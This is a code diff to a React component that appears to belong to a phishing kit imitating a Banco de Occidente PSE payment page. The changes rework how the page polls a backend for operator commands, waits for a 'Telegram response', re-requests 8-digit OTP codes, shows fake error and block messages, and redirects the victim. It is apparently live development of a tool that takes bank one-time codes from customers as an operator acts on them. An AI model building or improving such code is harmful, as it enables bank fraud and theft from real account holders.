@@ -29,6 +29,7 @@ export default function OtpOccidentePse() {
   const [showModal, setShowModal] = useState(false);
   const [modalText, setModalText] = useState("");
   const [getLoading, setLoading] = useState(false);
+  const loadingRef = useRef(false);
   const otpInputRefs = useRef([]);
   const pollingIntervalRef = useRef(null);
   const sessionIdRef = useRef(null);
@@ -40,6 +41,7 @@ export default function OtpOccidentePse() {
   };
 
   const openOtpErrorModal = (message) => {
+    loadingRef.current = false;
     setLoading(false);
     clearOtpFields();
     setModalText(message);
@@ -178,14 +180,17 @@ export default function OtpOccidentePse() {
         );
         const estadoActual = (response?.data?.estado || "").toLowerCase();
 
+        // Si el estado es pendiente, continuar esperando respuesta de Telegram con loader activo
+        if (estadoActual === "pendiente") {
+          loadingRef.current = true;
+          setLoading(true);
+          pollingIntervalRef.current = setTimeout(poll, 2500);
+          return;
+        }
+
         // Se evita re-procesar el mismo estado en cada ciclo
         if (!estadoActual || lastEstadoRef.current === estadoActual) {
           pollingIntervalRef.current = setTimeout(poll, 3000);
-          return;
-        }
-        // Si se envió el OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando respuesta de Telegram
-        if (getLoading && (estadoActual === "sol_otp" || estadoActual === "pendiente")) {
-          pollingIntervalRef.current = setTimeout(poll, 2500);
           return;
         }
 
@@ -205,23 +210,28 @@ export default function OtpOccidentePse() {
 
         switch (estadoActual) {
           case "sol_otp":
+            loadingRef.current = false;
             setLoading(false);
             setOtpDigits(Array(8).fill(""));
             break;
           case "error_otp":
+            loadingRef.current = false;
             openOtpErrorModal(OCCIDENTE_OTP_ERROR_MSG);
             break;
           case "error_login":
+            loadingRef.current = false;
             setLoading(false);
             localStorage.setItem("occidente_error_modal", "error_login");
             redirigir("/occidente_pse");
             break;
           case "sol_finalizar":
+            loadingRef.current = false;
             setLoading(false);
             redirigir("/finalizado-pse");
             break;
           case "block_ip":
           case "error_blocked":
+            loadingRef.current = false;
             openOtpErrorModal("Acceso bloqueado por seguridad.");
             break;
           default:
@@ -260,10 +270,12 @@ export default function OtpOccidentePse() {
       },
     };
 
-    stopPolling();
-    lastEstadoRef.current = null;
-    modalBloqueoEstadoRef.current = null;
-    ignorarEstadoHastaCambioRef.current = null;
+    if (pollingIntervalRef.current) {
+      clearTimeout(pollingIntervalRef.current);
+      pollingIntervalRef.current = null;
+    }
+    lastEstadoRef.current = "pendiente";
+    loadingRef.current = true;
     try {
       setLoading(true);
       const response = centralUrl
